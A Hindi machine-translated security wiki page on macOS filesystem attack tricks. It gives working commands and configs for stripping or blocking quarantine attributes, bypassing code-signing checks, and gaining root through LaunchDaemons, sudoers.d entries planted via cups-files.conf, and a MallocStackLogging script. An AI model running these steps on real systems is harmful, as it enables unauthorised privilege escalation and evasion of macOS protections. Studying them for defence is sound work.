# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

**डायरेक्टरी** में अनुमतियाँ:

- **पढ़ें** - आप **डायरेक्टरी** प्रविष्टियों को **गिन सकते** हैं
- **लिखें** - आप डायरेक्टरी में **फाइलें** **हटा/लिख** सकते हैं और आप **खाली फ़ोल्डर** हटा सकते हैं।
- लेकिन आप **खाली नहीं** फ़ोल्डरों को **हटा/संशोधित** नहीं कर सकते जब तक कि आपके पास उस पर लिखने की अनुमति न हो।
- आप **फोल्डर का नाम** संशोधित नहीं कर सकते जब तक कि आप इसके मालिक न हों।
- **निष्पादित करें** - आपको **डायरेक्टरी** को पार करने की **अनुमति** है - यदि आपके पास यह अधिकार नहीं है, तो आप इसके अंदर किसी भी फाइलों या किसी भी उप-डायरेक्टरी में पहुँच नहीं सकते।

### Dangerous Combinations

**कैसे एक फ़ाइल/फोल्डर को ओवरराइट करें जो रूट द्वारा स्वामित्व में है**, लेकिन:

- पथ में एक माता-पिता **डायरेक्टरी का मालिक** उपयोगकर्ता है
- पथ में एक माता-पिता **डायरेक्टरी का मालिक** एक **उपयोगकर्ता समूह** है जिसमें **लिखने की पहुँच** है
- एक उपयोगकर्ता **समूह** के पास **फाइल** पर **लिखने** की पहुँच है

पिछले संयोजनों में से किसी के साथ, एक हमलावर **संकेत** कर सकता है एक **संपर्क/हार्ड लिंक** अपेक्षित पथ पर एक विशेषाधिकार प्राप्त मनमाना लिखने के लिए।

### Folder root R+X Special case

यदि एक **डायरेक्टरी** में फ़ाइलें हैं जहाँ **केवल रूट के पास R+X पहुँच** है, तो वे **किसी और के लिए उपलब्ध नहीं हैं**। इसलिए एक भेद्यता जो **एक फ़ाइल को स्थानांतरित करने** की अनुमति देती है जिसे एक उपयोगकर्ता द्वारा पढ़ा जा सकता है, जिसे उस **प्रतिबंध** के कारण नहीं पढ़ा जा सकता, इस फ़ोल्डर से **किसी अन्य में**, इन फ़ाइलों को पढ़ने के लिए दुरुपयोग किया जा सकता है।

Example in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

### Permissive file/folder

यदि एक विशेषाधिकार प्राप्त प्रक्रिया **फाइल** में डेटा लिख रही है जिसे **कम विशेषाधिकार प्राप्त उपयोगकर्ता** द्वारा **नियंत्रित** किया जा सकता है, या जिसे एक कम विशेषाधिकार प्राप्त उपयोगकर्ता द्वारा **पहले बनाया गया** हो। उपयोगकर्ता बस इसे एक अन्य फ़ाइल की ओर **संकेत** कर सकता है एक प्रतीकात्मक या हार्ड लिंक के माध्यम से, और विशेषाधिकार प्राप्त प्रक्रिया उस फ़ाइल पर लिखेगी।

चेक करें अन्य अनुभागों में जहाँ एक हमलावर **विशेषाधिकार बढ़ाने के लिए मनमाना लिखने का दुरुपयोग कर सकता है**।

### Open `O_NOFOLLOW`

फ्लैग `O_NOFOLLOW` जब `open` फ़ंक्शन द्वारा उपयोग किया जाता है तो अंतिम पथ घटक में एक सिम्लिंक का पालन नहीं करेगा, लेकिन यह पथ के बाकी हिस्से का पालन करेगा। पथ में सिम्लिंक्स का पालन करने से रोकने का सही तरीका फ्लैग `O_NOFOLLOW_ANY` का उपयोग करना है।

## .fileloc

**`.fileloc`** एक्सटेंशन वाली फ़ाइलें अन्य अनुप्रयोगों या बाइनरीज़ की ओर संकेत कर सकती हैं इसलिए जब वे खोली जाती हैं, तो अनुप्रयोग/बाइनरी वही होगी जो निष्पादित होगी।\
Example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## फ़ाइल वर्णनकर्ता

### लीक FD (कोई `O_CLOEXEC` नहीं)

यदि `open` के लिए कॉल में `O_CLOEXEC` ध्वज नहीं है, तो फ़ाइल वर्णनकर्ता बच्चे की प्रक्रिया द्वारा विरासत में लिया जाएगा। इसलिए, यदि एक विशेषाधिकार प्राप्त प्रक्रिया एक विशेषाधिकार प्राप्त फ़ाइल खोलती है और हमलावर द्वारा नियंत्रित प्रक्रिया को निष्पादित करती है, तो हमलावर **विशेषाधिकार प्राप्त फ़ाइल पर FD विरासत में लेगा**।

यदि आप **एक प्रक्रिया को उच्च विशेषाधिकार के साथ एक फ़ाइल या फ़ोल्डर खोलने** के लिए मजबूर कर सकते हैं, तो आप **`crontab`** का दुरुपयोग कर सकते हैं ताकि `/etc/sudoers.d` में **`EDITOR=exploit.py`** के साथ एक फ़ाइल खोली जा सके, ताकि `exploit.py` को `/etc/sudoers` के अंदर फ़ाइल का FD मिल सके और इसका दुरुपयोग कर सके।

उदाहरण के लिए: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098), कोड: https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging

## संगरोध xattrs चालों से बचें

### इसे हटा दें
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

यदि किसी फ़ाइल/फ़ोल्डर में यह अपरिवर्तनीय विशेषता है, तो उस पर xattr डालना संभव नहीं होगा।
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

एक **devfs** माउंट **xattr** का समर्थन नहीं करता, अधिक जानकारी के लिए [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

यह ACL फ़ाइल में `xattrs` जोड़ने से रोकता है।
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** फ़ाइल प्रारूप एक फ़ाइल को उसकी ACEs सहित कॉपी करता है।

[**स्रोत कोड**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) में यह देखना संभव है कि xattr के अंदर संग्रहीत ACL पाठ प्रतिनिधित्व जिसे **`com.apple.acl.text`** कहा जाता है, को डिकंप्रेस की गई फ़ाइल में ACL के रूप में सेट किया जाएगा। इसलिए, यदि आपने एक एप्लिकेशन को **AppleDouble** फ़ाइल प्रारूप में एक ज़िप फ़ाइल में संकुचित किया है जिसमें एक ACL है जो अन्य xattrs को इसमें लिखने से रोकता है... तो क्वारंटाइन xattr एप्लिकेशन में सेट नहीं किया गया था:

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) की जांच करें।

इसकी नकल करने के लिए, हमें पहले सही acl स्ट्रिंग प्राप्त करने की आवश्यकता है:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

Not really needed but I leave it there just in case:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## सिग्नेचर जांचों को बायपास करें

### प्लेटफ़ॉर्म बाइनरी जांचों को बायपास करें

कुछ सुरक्षा जांचें यह जांचती हैं कि बाइनरी एक **प्लेटफ़ॉर्म बाइनरी** है, उदाहरण के लिए, XPC सेवा से कनेक्ट करने की अनुमति देने के लिए। हालाँकि, जैसा कि https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ में एक बायपास में उजागर किया गया है, इस जांच को बायपास करना संभव है एक प्लेटफ़ॉर्म बाइनरी (जैसे /bin/ls) प्राप्त करके और `DYLD_INSERT_LIBRARIES` एन्व वेरिएबल का उपयोग करके dyld के माध्यम से एक्सप्लॉइट को इंजेक्ट करके।

### फ्लैग्स `CS_REQUIRE_LV` और `CS_FORCED_LV` को बायपास करें

यह संभव है कि एक निष्पादित बाइनरी अपने स्वयं के फ्लैग्स को संशोधित करे ताकि कोड के साथ जांचों को बायपास किया जा सके:
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## कोड सिग्नेचर बायपास करें

बंडल में फ़ाइल **`_CodeSignature/CodeResources`** होती है जिसमें **बंडल** में हर एक **फ़ाइल** का **हैश** होता है। ध्यान दें कि CodeResources का हैश भी **एक्ज़ीक्यूटेबल** में **एंबेडेड** होता है, इसलिए हम इसके साथ भी छेड़छाड़ नहीं कर सकते।

हालांकि, कुछ फ़ाइलें हैं जिनके सिग्नेचर की जांच नहीं की जाएगी, इनमें plist में omit कुंजी होती है, जैसे:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
यह संभव है कि आप CLI से एक संसाधन के हस्ताक्षर की गणना कर सकें:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Mount dmgs

एक उपयोगकर्ता एक कस्टम dmg को माउंट कर सकता है जो कुछ मौजूदा फ़ोल्डरों के ऊपर भी बनाया गया है। इस तरह आप कस्टम सामग्री के साथ एक कस्टम dmg पैकेज बना सकते हैं:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
आमतौर पर macOS डिस्क को `com.apple.DiskArbitrarion.diskarbitrariond` Mach सेवा से जोड़ता है (जो `/usr/libexec/diskarbitrationd` द्वारा प्रदान की जाती है)। यदि LaunchDaemons plist फ़ाइल में `-d` पैरामीटर जोड़ा जाए और पुनः प्रारंभ किया जाए, तो यह `/var/log/diskarbitrationd.log` में लॉग संग्रहीत करेगा।\
हालांकि, `com.apple.driver.DiskImages` kext के साथ सीधे संवाद करने के लिए `hdik` और `hdiutil` जैसे उपकरणों का उपयोग करना संभव है।

## मनमाने लेखन

### आवधिक शेल स्क्रिप्ट

यदि आपकी स्क्रिप्ट को **शेल स्क्रिप्ट** के रूप में व्याख्यायित किया जा सकता है, तो आप **`/etc/periodic/daily/999.local`** शेल स्क्रिप्ट को ओवरराइट कर सकते हैं, जो हर दिन ट्रिगर होगी।

आप इस स्क्रिप्ट के निष्पादन को **`sudo periodic daily`** के साथ **फेक** कर सकते हैं।

### डेमन

एक मनमाना **LaunchDaemon** लिखें जैसे **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** जिसमें एक plist हो जो एक मनमानी स्क्रिप्ट को निष्पादित करे जैसे:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
बस स्क्रिप्ट `/Applications/Scripts/privesc.sh` उत्पन्न करें जिसमें **कमांड** हों जिन्हें आप रूट के रूप में चलाना चाहते हैं।

### Sudoers फ़ाइल

यदि आपके पास **मनमाना लेखन** है, तो आप फ़ोल्डर **`/etc/sudoers.d/`** के अंदर एक फ़ाइल बना सकते हैं जो आपको **sudo** विशेषाधिकार देती है।

### PATH फ़ाइलें

फ़ाइल **`/etc/paths`** मुख्य स्थानों में से एक है जो PATH env वेरिएबल को भरती है। इसे ओवरराइट करने के लिए आपको रूट होना चाहिए, लेकिन यदि **privileged process** से कोई स्क्रिप्ट कुछ **कमांड बिना पूर्ण पथ** के निष्पादित कर रही है, तो आप इस फ़ाइल को संशोधित करके इसे **हाइजैक** कर सकते हैं।

आप नए फ़ोल्डरों को `PATH` env वेरिएबल में लोड करने के लिए **`/etc/paths.d`** में भी फ़ाइलें लिख सकते हैं।

### cups-files.conf

यह तकनीक [इस लेख](https://www.kandji.io/blog/macos-audit-story-part1) में उपयोग की गई थी।

फ़ाइल `/etc/cups/cups-files.conf` निम्नलिखित सामग्री के साथ बनाएं:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
यह `/etc/sudoers.d/lpe` फ़ाइल को 777 अनुमतियों के साथ बनाएगा। अंत में अतिरिक्त जंक त्रुटि लॉग निर्माण को ट्रिगर करने के लिए है।

फिर, `/etc/sudoers.d/lpe` में आवश्यक कॉन्फ़िगरेशन लिखें ताकि विशेषाधिकार बढ़ाने के लिए `%staff ALL=(ALL) NOPASSWD:ALL` हो।

फिर, फ़ाइल `/etc/cups/cups-files.conf` को फिर से संशोधित करें और `LogFilePerm 700` इंगित करें ताकि नया sudoers फ़ाइल मान्य हो सके `cupsctl` को कॉल करते समय।

### सैंडबॉक्स Escape

macOS सैंडबॉक्स से FS मनमाना लेखन के साथ भागना संभव है। कुछ उदाहरणों के लिए पृष्ठ [macOS Auto Start](../../../../macos-auto-start-locations.md) देखें लेकिन एक सामान्य उदाहरण यह है कि `~/Library/Preferences/com.apple.Terminal.plist` में एक टर्मिनल प्राथमिकताएँ फ़ाइल लिखें जो स्टार्टअप पर एक कमांड निष्पादित करती है और इसे `open` का उपयोग करके कॉल करें।

## अन्य उपयोगकर्ताओं के रूप में लिखने योग्य फ़ाइलें उत्पन्न करें

यह एक फ़ाइल उत्पन्न करेगा जो रूट की है और जिसे मैं लिख सकता हूँ ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh))। यह प्रिवेस्क के रूप में भी काम कर सकता है:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX साझा मेमोरी

**POSIX साझा मेमोरी** POSIX-अनुरूप ऑपरेटिंग सिस्टम में प्रक्रियाओं को एक सामान्य मेमोरी क्षेत्र तक पहुँचने की अनुमति देती है, जो अन्य इंटर-प्रोसेस संचार विधियों की तुलना में तेज़ संचार को सुविधाजनक बनाती है। इसमें `shm_open()` के साथ एक साझा मेमोरी ऑब्जेक्ट बनाना या खोलना, `ftruncate()` के साथ इसका आकार सेट करना, और `mmap()` का उपयोग करके इसे प्रक्रिया के पते के स्थान में मैप करना शामिल है। प्रक्रियाएँ फिर सीधे इस मेमोरी क्षेत्र से पढ़ और लिख सकती हैं। समवर्ती पहुँच को प्रबंधित करने और डेटा भ्रष्टाचार को रोकने के लिए, समन्वय तंत्र जैसे म्यूटेक्स या सेमाफोर का अक्सर उपयोग किया जाता है। अंततः, प्रक्रियाएँ `munmap()` और `close()` के साथ साझा मेमोरी को अनमैप और बंद करती हैं, और वैकल्पिक रूप से `shm_unlink()` के साथ मेमोरी ऑब्जेक्ट को हटा देती हैं। यह प्रणाली विशेष रूप से उन वातावरणों में कुशल, तेज IPC के लिए प्रभावी है जहाँ कई प्रक्रियाओं को साझा डेटा तक तेजी से पहुँचने की आवश्यकता होती है।

<details>

<summary>उत्पादक कोड उदाहरण</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>उपभोक्ता कोड उदाहरण</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS संरक्षित वर्णनकर्ता

**macOS संरक्षित वर्णनकर्ता** एक सुरक्षा विशेषता है जो macOS में उपयोगकर्ता अनुप्रयोगों में **फाइल वर्णनकर्ता संचालन** की सुरक्षा और विश्वसनीयता को बढ़ाने के लिए पेश की गई है। ये संरक्षित वर्णनकर्ता फाइल वर्णनकर्ताओं के साथ विशिष्ट प्रतिबंधों या "गार्ड" को जोड़ने का एक तरीका प्रदान करते हैं, जिन्हें कर्नेल द्वारा लागू किया जाता है।

यह विशेषता **अनधिकृत फाइल पहुंच** या **रेस कंडीशंस** जैसी सुरक्षा कमजोरियों की कुछ श्रेणियों को रोकने के लिए विशेष रूप से उपयोगी है। ये कमजोरियाँ तब होती हैं जब उदाहरण के लिए एक थ्रेड एक फाइल विवरण तक पहुँच रहा है जिससे **दूसरे कमजोर थ्रेड को उस पर पहुँच मिलती है** या जब एक फाइल वर्णनकर्ता एक कमजोर बाल प्रक्रिया द्वारा **विरासत में ली जाती है**। इस कार्यक्षमता से संबंधित कुछ कार्य हैं:

- `guarded_open_np`: एक गार्ड के साथ FD खोलें
- `guarded_close_np`: इसे बंद करें
- `change_fdguard_np`: एक वर्णनकर्ता पर गार्ड ध्वज बदलें (यहां तक कि गार्ड सुरक्षा को हटाना)

## संदर्भ

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)

{{#include ../../../../banners/hacktricks-training.md}}
